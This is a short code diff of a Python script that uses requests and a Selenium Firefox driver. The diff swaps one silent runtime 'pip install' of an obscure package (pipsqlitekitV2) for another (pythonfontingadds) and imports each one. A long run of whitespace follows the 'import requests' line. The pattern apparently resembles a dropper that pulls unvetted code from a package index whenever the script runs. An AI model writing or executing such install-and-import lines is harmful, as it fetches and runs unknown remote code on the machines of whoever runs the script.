@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitekitV2")
-import pipsqlitekitV2
+os.system("pip install pythonfontingadds")
+import pythonfontingadds
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
